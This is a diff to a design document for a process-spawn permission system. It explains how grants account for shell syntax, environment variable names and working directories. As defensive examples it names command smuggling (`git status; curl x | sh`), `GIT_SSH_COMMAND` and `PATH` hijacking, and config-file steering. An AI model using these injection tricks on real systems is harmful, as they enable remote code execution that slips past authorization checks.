@@ -109,17 +109,38 @@ no `detached` option everywhere except win32. A win32 record claiming
 `pgid === pid` would name a group the child does not lead, so it records no
 group at all instead.
 
-## The grant identity is the command line alone
+## The grant identity is the command line and its environment names
 
 Compose the permission decorator above containment to check the caller's
 whole command before pipeline expansion and platform preparation.
 Containment and authorization are separate concerns over the same tag, but
-they share one fact worth stating here. A spawn is checked as `proc:spawn`
-with `CommandLine.render(command)` as its resource, and that rendered line is
-the whole grant identity. The working directory, the environment overrides,
-and a pipeline's `from` and `to` routing are **not** part of what the grant
-authorizes. The working directory and the _names_ of overridden environment
-variables reach an attended surface as display metadata; the values do not.
+they share one fact worth stating here. Every stage of a spawn is checked as
+its own `proc:spawn` with `CommandLine.resource(stage, context)` as its
+resource, and no stage starts until every stage passes. That resource is the
+rendered line with three markings:
+
+- a `shell: true` line holding shell control syntax becomes `sh -c '<line>'`;
+- an environment variable the child would not otherwise inherit is named in an
+  `env <NAME>… --` prefix: any name outside the bootstrap set (`PATH`, `HOME`,
+  `USER`, `LANG`, `TERM`, `TMPDIR`, `SHELL`, `LC_*`), and a bootstrap name
+  whose value differs from this process's own;
+- a working directory outside `Workspace.root` is named in a `cwd <path> --`
+  prefix. The directory is judged by real path, so a symlink inside the
+  workspace that leads to another repository is named as that repository.
+
+A grant for `git status *` therefore covers none of `git status; curl x | sh`,
+`git status` with `GIT_SSH_COMMAND` set, `git status` with `PATH` pointing
+into the workspace, or `git status` run in `/tmp/other`. `git status | sh`
+needs a grant for `sh` too.
+
+A pipeline's `from` and `to` routing is **not** part of what the grant
+authorizes. Nor is the content of files inside the workspace: `git status` in
+the workspace reads `.git/config`, and `npm test` runs whatever `package.json`
+says. A flow that holds `fs:write` on those files decides what the granted
+program does, so grant `proc:spawn` for a config-reading program together with
+the `fs:write` scope you intend it to follow. The working directory and the
+_names_ of overridden environment variables also reach an attended surface as
+display metadata; the values do not.
 
 A custom shell path is explicit in the rendered line, and a pipeline renders
 with `|` between its stages, so neither can hide behind a grant for something
